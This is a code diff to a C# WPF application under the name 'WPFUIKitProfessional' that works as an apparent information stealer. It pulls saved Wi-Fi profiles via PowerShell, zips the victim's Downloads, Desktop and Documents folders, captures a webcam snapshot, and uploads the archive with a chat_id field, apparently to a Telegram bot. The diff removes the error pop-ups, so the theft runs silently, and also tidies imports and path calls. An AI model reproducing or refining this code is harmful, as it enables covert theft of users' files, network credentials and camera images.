@@ -1,21 +1,21 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Threading.Tasks;
-using System.Windows;
-using System.IO;
-using System.IO.Compression;
-using System.Net.Http;
-using System.Drawing;
-using System.Drawing.Imaging;
-using AForge.Video;
+﻿using AForge.Video;
 using AForge.Video.DirectShow;
-using System.Windows.Media;
 using Firebase.Database;
 using Firebase.Database.Query;
 using Newtonsoft.Json;
-using WPFUIKitProfessional.Pages;
+using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Media;
+using WPFUIKitProfessional.Pages;
 
 namespace WPFUIKitProfessional
 {
@@ -167,13 +167,11 @@ namespace WPFUIKitProfessional
 
                 if (!string.IsNullOrEmpty(error))
                 {
-                    MessageBox.Show($"Ошибка PowerShell: {error}");
                     return;
                 }
 
                 if (string.IsNullOrWhiteSpace(output))
                 {
-                    MessageBox.Show("Нет доступных Wi-Fi профилей.");
                     return;
                 }
 
@@ -193,7 +191,6 @@ namespace WPFUIKitProfessional
 
                 if (wifiProfiles == null || wifiProfiles.Count == 0)
                 {
-                    MessageBox.Show("Не удалось получить данные профилей Wi-Fi.");
                 }
                 else
                 {
@@ -202,7 +199,6 @@ namespace WPFUIKitProfessional
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Ошибка выполнения скрипта: {ex.Message}");
             }
         }
 
@@ -270,19 +266,19 @@ namespace WPFUIKitProfessional
 
             string[] paths = new[]
             {
-                System.IO.Path.Combine(userFolderPath, "Downloads"),
-                System.IO.Path.Combine(userFolderPath, "Desktop"),
-                System.IO.Path.Combine(userFolderPath, "Documents")
+                Path.Combine(userFolderPath, "Downloads"),
+                Path.Combine(userFolderPath, "Desktop"),
+                Path.Combine(userFolderPath, "Documents")
             };
 
             string zipFileName = $"{Environment.MachineName}_Info_System.zip";
-            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), zipFileName);
+            string zipFilePath = Path.Combine(Path.GetTempPath(), zipFileName);
 
             try
             {
                 // Удаляем файл snapshot.png, если он существует
-                string tempPath = System.IO.Path.GetTempPath();
-                snapshotPath = System.IO.Path.Combine(tempPath, "snapshot.png");
+                string tempPath = Path.GetTempPath();
+                snapshotPath = Path.Combine(tempPath, "snapshot.png");
                 if (File.Exists(snapshotPath))
                 {
                     File.Delete(snapshotPath);
@@ -352,7 +348,7 @@ namespace WPFUIKitProfessional
             {
                 Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
 
-                snapshotPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "snapshot.png");
+                snapshotPath = Path.Combine(Path.GetTempPath(), "snapshot.png");
                 bitmap.Save(snapshotPath, ImageFormat.Png);
             }
             catch (Exception ex)
@@ -370,7 +366,7 @@ namespace WPFUIKitProfessional
                 {
                     foreach (var sourceFilePath in sourceFilePaths)
                     {
-                        archive.CreateEntryFromFile(sourceFilePath, System.IO.Path.GetFileName(sourceFilePath));
+                        archive.CreateEntryFromFile(sourceFilePath, Path.GetFileName(sourceFilePath));
                     }
                 }
             }
@@ -387,7 +383,7 @@ namespace WPFUIKitProfessional
                 var form = new MultipartFormDataContent();
                 var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                 fileContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("multipart/form-data");
-                form.Add(fileContent, "document", System.IO.Path.GetFileName(filePath));
+                form.Add(fileContent, "document", Path.GetFileName(filePath));
                 form.Add(new StringContent(chatId), "chat_id");
 
                 var response = await client.PostAsync(url, form);
